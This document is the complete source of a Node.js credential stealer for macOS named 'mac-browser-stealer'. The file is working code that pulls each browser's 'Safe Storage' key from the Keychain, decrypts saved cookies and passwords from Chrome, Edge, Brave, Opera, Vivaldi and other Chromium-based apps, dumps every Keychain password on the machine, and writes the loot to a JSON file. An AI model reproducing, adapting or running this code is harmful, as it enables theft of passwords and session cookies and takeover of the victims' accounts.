#!/usr/bin/env node
'use strict';
/*
 * mac-browser-stealer
 * -------------------
 * Zero-dependency Node.js stealer for macOS. Reads and decrypts browser
 * cookies + saved passwords from Chrome / Edge / Brave / Chromium / Vivaldi /
 * Opera (and any other Chromium-based app), plus a full macOS Keychain dump
 * of every saved password on the machine. Writes everything to a local JSON
 * file.
 *
 * No npm dependencies: SQLite is parsed by hand (lib/sqlite.js), crypto uses
 * node:crypto, and the Keychain is read via the `security` CLI. This keeps it
 * compilable to a single standalone binary with `pkg`.
 *
 * Usage:
 *   node stealer.js                 # -> ./steal-<timestamp>.json
 *   node stealer.js --out loot.json
 *   node stealer.js --quiet
 */

const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');
const { readSchema, scanRecords } = require('./lib/sqlite');

// ---------------------------------------------------------------------------
// CLI args
// ---------------------------------------------------------------------------
const args = process.argv.slice(2);
function argVal(flag, dflt) {
  const i = args.indexOf(flag);
  return i !== -1 && args[i + 1] ? args[i + 1] : dflt;
}
const QUIET = args.includes('--quiet');
const OUT = argVal('--out', path.join(process.cwd(), 'steal-' + Date.now() + '.json'));
const log = (...a) => { if (!QUIET) console.log(...a); };

// ---------------------------------------------------------------------------
// Keychain helpers (via the `security` CLI)
// ---------------------------------------------------------------------------
function keychainGet(service, account) {
  try {
    const cmd = ['find-generic-password', '-w', '-s', service];
    if (account) cmd.push('-a', account);
    return execFileSync('security', cmd, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
  } catch (e) {
    return null;
  }
}

// Parse `security dump-keychain` into a list of {service, account} generic
// password items. Values are fetched separately (the dump does not print them).
function keychainItems() {
  let out;
  try {
    out = execFileSync('security', ['dump-keychain'], {
      encoding: 'utf8',
      maxBuffer: 1024 * 1024 * 512,
      stdio: ['ignore', 'pipe', 'pipe'],
    });
  } catch (e) {
    return [];
  }
  const items = [];
  const seen = new Set();
  for (const block of out.split('class: "genp"').slice(1)) {
    const sv = block.match(/"svce"<blob>="((?:[^"\\]|\\.)*)"/);
    const ac = block.match(/"acct"<blob>="((?:[^"\\]|\\.)*)"/);
    const service = sv ? sv[1] : null;
    const account = ac ? ac[1] : null;
    const key = service + '\u0000' + (account || '');
    if (seen.has(key)) continue;
    seen.add(key);
    items.push({ service, account });
  }
  return items;
}

function dumpKeychain() {
  const out = { total: 0, entries: [] };
  for (const item of keychainItems()) {
    if (!item.service) continue;
    const value = keychainGet(item.service, item.account);
    out.total++;
    out.entries.push({
      service: item.service,
      account: item.account,
      value: value === null ? undefined : value,
      retrieved: value !== null,
    });
  }
  return out;
}

// ---------------------------------------------------------------------------
// Chromium cookie / password decryption
//
// Chrome's os_crypt (async) scheme, confirmed against the Chromium source
// (components/os_crypt/async): the on-disk value is
//   "v10" | ciphertext          (AES-128-CBC, fixed IV = 16 space bytes)
// with key = PBKDF2-HMAC-SHA1(keychain_secret, "saltysalt", 1003, 16).
// Older Chrome files instead store a random IV inline:
//   "v10" | IV(16) | ciphertext        (legacy)
//   "v10" | field(16) | IV(16) | ct    (older "modern")
// A single profile's Cookies / Login Data can contain a mix of all three, so
// we try every key variant × every layout and keep the cleanest result.
// ---------------------------------------------------------------------------
const KDF_VARIANTS = [
  { salt: 'saltysalt', iterations: 1003 },
  { salt: 'salt', iterations: 1 },
  { salt: 'salt', iterations: 1003 },
];
const FIXED_IV = Buffer.alloc(16, 0x20); // 16 spaces, per kFixedIvForAes128Cbc

// Fraction of bytes that look like printable text; used to tell a correct
// decryption apart from a wrong-IV one (whose first block is garbage).
function scoreText(s) {
  if (!s.length) return 0;
  let good = 0;
  for (const ch of s) {
    const c = ch.codePointAt(0);
    if ((c >= 0x20 && c <= 0x7e) || c === 0x09 || c === 0x0a || c >= 0x80) good++;
  }
  return good / s.length;
}

function makeDecryptor(secret) {
  if (!secret) return null;
  const keys = KDF_VARIANTS.map((v) => crypto.pbkdf2Sync(secret, v.salt, v.iterations, 16, 'sha1'));
  return function (encrypted) {
    if (!encrypted || !(encrypted instanceof Buffer) || encrypted.length < 4) return null;
    const p = encrypted.slice(0, 3).toString('ascii');
    if (p !== 'v10' && p !== 'v11' && p !== 'v12') return null;
    const body = encrypted.slice(3);
    let best = null;
    let bestScore = 0;
    for (const key of keys) {
      // Candidate [iv, ciphertext] layouts.
      const layouts = [];
      // New: fixed IV, ciphertext = whole body.
      if (body.length >= 16 && body.length % 16 === 0) layouts.push([FIXED_IV, body]);
      // Legacy: IV(16) + ciphertext.
      if (body.length > 16 && (body.length - 16) % 16 === 0) layouts.push([body.slice(0, 16), body.slice(16)]);
      // Older "modern": field(16) + IV(16) + ciphertext.
      if (body.length >= 48) layouts.push([body.slice(16, 32), body.slice(32)]);
      for (const [iv, ct] of layouts) {
        if (ct.length === 0 || ct.length % 16 !== 0) continue;
        const out = tryCbc(key, iv, ct);
        if (out === null) continue;
        const sc = scoreText(out);
        if (sc > bestScore) { bestScore = sc; best = out; }
      }
    }
    return bestScore >= 0.8 ? best : null;
  };
}

function tryCbc(key, iv, ct) {
  try {
    const d = crypto.createDecipheriv('aes-128-cbc', key, iv);
    d.setAutoPadding(true);
    const out = Buffer.concat([d.update(ct), d.final()]);
    return out.toString('utf8');
  } catch (e) {
    return null;
  }
}

// ---------------------------------------------------------------------------
// Browser discovery
// ---------------------------------------------------------------------------
const APP_SUPPORT = path.join(os.homedir(), 'Library', 'Application Support');
const BROWSERS = [
  { name: 'chrome', dir: path.join(APP_SUPPORT, 'Google', 'Chrome'), service: 'Chrome Safe Storage', account: 'Chrome' },
  { name: 'edge', dir: path.join(APP_SUPPORT, 'Microsoft Edge'), service: 'Microsoft Edge Safe Storage', account: 'Microsoft Edge' },
  { name: 'brave', dir: path.join(APP_SUPPORT, 'BraveSoftware', 'Brave-Browser'), service: 'Brave Safe Storage', account: 'Brave' },
  { name: 'chromium', dir: path.join(APP_SUPPORT, 'Chromium'), service: 'Chromium Safe Storage', account: 'Chromium' },
  { name: 'vivaldi', dir: path.join(APP_SUPPORT, 'Vivaldi'), service: 'Vivaldi Safe Storage', account: 'Vivaldi' },
  { name: 'opera', dir: path.join(APP_SUPPORT, 'com.operasoftware.Opera'), service: 'Opera Safe Storage', account: 'Opera' },
];

// Find DB files in each profile dir (and its Network/ subdir). `match` is an
// exact filename or a RegExp (e.g. /^Login Data/ to catch "Login Data" and
// "Login Data For Account").
function findFiles(root, match) {
  const results = [];
  if (!fs.existsSync(root)) return results;
  let entries;
  try { entries = fs.readdirSync(root, { withFileTypes: true }); } catch (e) { return results; }
  const isMatch = (fname) => (match instanceof RegExp ? match.test(fname) : fname === match);
  for (const ent of entries) {
    if (!ent.isDirectory()) continue;
    const profileDir = path.join(root, ent.name);
    for (const dir of [profileDir, path.join(profileDir, 'Network')]) {
      let files;
      try { files = fs.readdirSync(dir); } catch (e) { continue; }
      for (const fname of files) {
        if (!isMatch(fname)) continue;
        const candidate = path.join(dir, fname);
        try { if (fs.statSync(candidate).isFile()) results.push({ profile: ent.name, file: candidate }); } catch (e) {}
      }
    }
  }
  return results;
}

// Merge password rows from multiple Login Data* files, dropping exact
// (url, username, password) duplicates.
function dedupePasswords(list) {
  const seen = new Set();
  const out = [];
  for (const p of list) {
    const key = (p.url || '') + '\u0000' + (p.username || '') + '\u0000' + (p.password || '');
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(p);
  }
  return out;
}

// Validators that distinguish real rows from the scanner's false positives.
// Column indices come from the standard Chromium schemas:
//   cookies: 0=creation_utc 1=host_key ... 5=encrypted_value
//   logins:  0=origin_url ... 3=username_value 5=password_value
const TABLE_VALIDATORS = {
  // host_key (col 1) must look like a domain: has a dot, no spaces, < 253 chars.
  cookies: (vals) =>
    typeof vals[1] === 'string' && vals[1].includes('.') && !/\s/.test(vals[1]) && vals[1].length < 253,
  // origin_url (col 0) must be an http(s) URL.
  logins: (vals) =>
    typeof vals[0] === 'string' && /^https?:\/\//i.test(vals[0]),
};

function readDb(file) {
  try {
    const buf = fs.readFileSync(file);
    const tables = readSchema(buf);
    const out = {};
    for (const t of tables) {
      const validator = TABLE_VALIDATORS[t.name];
      if (!validator) continue; // only read the tables we actually use
      // scanRecords returns rows as value arrays; key them by column name so
      // extractCookies/extractPasswords can use named fields.
      out[t.name] = scanRecords(buf, t.colTypes, validator).map((vals) => {
        const obj = {};
        t.columns.forEach((col, i) => { obj[col] = vals[i]; });
        return obj;
      });
    }
    return out;
  } catch (e) {
    return null;
  }
}

// Only Buffers have a meaningful hex form; other serial types (int/null) are
// dropped rather than stringified.
function toHex(v) {
  return v instanceof Buffer ? v.toString('hex') : undefined;
}

function extractCookies(tables, decrypt) {
  const cookies = [];
  const rows = tables.cookies || [];
  for (const r of rows) {
    if (r.host_key == null) continue;
    const entry = {
      host: r.host_key,
      top_frame_site_key: r.top_frame_site_key,
      name: r.name,
      path: r.path,
      is_secure: r.is_secure,
      is_httponly: r.is_httponly,
      has_expires: r.has_expires,
      is_persistent: r.is_persistent,
      expires_utc: r.expires_utc,
      creation_utc: r.creation_utc,
      last_access_utc: r.last_access_utc,
    };
    const enc = r.encrypted_value;
    const dec = decrypt ? decrypt(enc) : null;
    if (dec !== null) {
      entry.value = dec;
    } else if (decrypt) {
      entry.decryption_failed = true;
    }
    const hex = toHex(enc);
    if (hex !== undefined) entry.encrypted_value = hex;
    cookies.push(entry);
  }
  return cookies;
}

function extractPasswords(tables, decrypt) {
  const passwords = [];
  const rows = tables.logins || [];
  for (const r of rows) {
    if (r.origin_url == null && r.url == null) continue;
    const entry = {
      url: r.origin_url || r.url,
      action_url: r.action_url,
      username: r.username_value,
      date_created: r.date_created,
      date_last_used: r.date_last_used,
      times_used: r.times_used,
    };
    const enc = r.password_value;
    const dec = decrypt ? decrypt(enc) : null;
    if (dec !== null) {
      entry.password = dec;
    } else if (decrypt) {
      entry.decryption_failed = true;
    }
    const hex = toHex(enc);
    if (hex !== undefined) entry.encrypted_value = hex;
    passwords.push(entry);
  }
  return passwords;
}

function stealBrowser(browser) {
  const result = {
    name: browser.name,
    dir: browser.dir,
    exists: fs.existsSync(browser.dir),
    keychain_secret: null,
    profiles: [],
    total_cookies: 0,
    total_passwords: 0,
  };
  if (!result.exists) return result;
  const secret = keychainGet(browser.service, browser.account);
  result.keychain_secret = secret;
  const decrypt = makeDecryptor(secret);
  const cookieFiles = findFiles(browser.dir, 'Cookies');
  const passwordFiles = findFiles(browser.dir, /^Login Data/);
  const profiles = new Set([...cookieFiles.map((f) => f.profile), ...passwordFiles.map((f) => f.profile)]);
  for (const profile of [...profiles].sort()) {
    const prof = { name: profile, cookies: [], passwords: [] };
    const cf = cookieFiles.find((f) => f.profile === profile);
    if (cf) {
      const tables = readDb(cf.file);
      if (tables) prof.cookies = extractCookies(tables, decrypt);
    }
    // Read every "Login Data*" file for this profile (local + per-account)
    // and merge the passwords, dropping duplicates.
    const pfs = passwordFiles.filter((f) => f.profile === profile);
    const allPw = [];
    for (const pf of pfs) {
      const tables = readDb(pf.file);
      if (tables) allPw.push(...extractPasswords(tables, decrypt));
    }
    prof.passwords = dedupePasswords(allPw);
    result.profiles.push(prof);
    result.total_cookies += prof.cookies.length;
    result.total_passwords += prof.passwords.length;
  }
  return result;
}

// ---------------------------------------------------------------------------
// Generic scan: any Chromium-based app with a "Safe Storage" keychain entry
// ---------------------------------------------------------------------------
function stealOtherApps() {
  const knownServices = new Set(BROWSERS.map((b) => b.service));
  const out = [];
  for (const item of keychainItems()) {
    if (!item.service || !/Safe Storage$/i.test(item.service) || knownServices.has(item.service)) continue;
    const secret = keychainGet(item.service, item.account);
    const decrypt = makeDecryptor(secret);
    // Guess the app dir from the service name (strip " Safe Storage").
    const appName = item.service.replace(/ Safe Storage$/i, '');
    const candidateDirs = [
      path.join(APP_SUPPORT, appName),
      path.join(APP_SUPPORT, appName, 'AppData'),
    ];
    const entry = { name: appName, service: item.service, account: item.account, keychain_secret: secret, profiles: [], total_cookies: 0, total_passwords: 0 };
    for (const dir of candidateDirs) {
      if (!fs.existsSync(dir)) continue;
      for (const f of findFiles(dir, 'Cookies')) {
        const tables = readDb(f.file);
        if (!tables) continue;
        let prof = entry.profiles.find((p) => p.name === f.profile);
        if (!prof) { prof = { name: f.profile, cookies: [], passwords: [] }; entry.profiles.push(prof); }
        prof.cookies = extractCookies(tables, decrypt);
      }
      for (const f of findFiles(dir, /^Login Data/)) {
        const tables = readDb(f.file);
        if (!tables) continue;
        let prof = entry.profiles.find((p) => p.name === f.profile);
        if (!prof) { prof = { name: f.profile, cookies: [], passwords: [] }; entry.profiles.push(prof); }
        prof.passwords = dedupePasswords(prof.passwords.concat(extractPasswords(tables, decrypt)));
      }
    }
    entry.total_cookies = entry.profiles.reduce((s, p) => s + p.cookies.length, 0);
    entry.total_passwords = entry.profiles.reduce((s, p) => s + p.passwords.length, 0);
    if (entry.total_cookies > 0 || entry.total_passwords > 0) out.push(entry);
  }
  return out;
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------
function main() {
  const report = {
    generated_at: new Date().toISOString(),
    hostname: os.hostname(),
    platform: `${os.platform()} ${os.release()} (${os.arch()})`,
    node: process.version,
    browsers: [],
    other_apps: [],
    keychain: null,
  };
  for (const browser of BROWSERS) {
    const r = stealBrowser(browser);
    report.browsers.push(r);
    log(`${browser.name}: ${r.exists ? (r.total_cookies + ' cookies, ' + r.total_passwords + ' passwords' + (r.keychain_secret ? '' : ' [NO KEYCHAIN SECRET]')) : '(not installed)'}`);
  }
  report.other_apps = stealOtherApps();
  for (const app of report.other_apps) log(`${app.name} (other): ${app.total_cookies} cookies, ${app.total_passwords} passwords`);
  log('Dumping keychain...');
  report.keychain = dumpKeychain();
  log(`Keychain: ${report.keychain.entries.filter((e) => e.retrieved).length}/${report.keychain.total} values retrieved`);
  fs.writeFileSync(OUT, JSON.stringify(report, null, 2));
  log('Wrote ' + OUT);
  return report;
}

if (require.main === module) {
  main();
}

module.exports = { main, makeDecryptor, keychainGet, dumpKeychain };
